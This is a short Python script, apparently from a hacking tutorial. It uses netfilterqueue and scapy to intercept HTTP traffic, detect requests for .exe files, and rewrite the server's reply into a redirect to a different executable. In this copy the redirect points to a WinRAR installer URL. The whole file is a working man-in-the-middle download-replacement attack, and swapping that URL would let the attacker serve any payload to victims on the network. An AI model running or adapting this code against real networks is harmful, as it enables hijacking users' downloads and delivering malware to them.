import netfilterqueue
import scapy.all as scapy 

ack_list = []

def set_load(packet , load):
    packet[scapy.Raw].load = load  
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())#this method it will show the accrual content inside the packet itself 
    if scapy_packet.haslayer(scapy.Raw): 
        if scapy_packet[scapy.TCP].dport == 80:#destination port , in the tcp layer it's called http , but behind the scene it's 80 by default
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("exe Request ")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:#sport means source port 
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove( scapy_packet[scapy.TCP].seq)
                print("Replacing file...")
                modified_packet = set_load(scapy_packet ,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-602b1ar.exe\n\n" )
                
                packet.set_payload(str(modified_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0 , process_packet)
queue.run()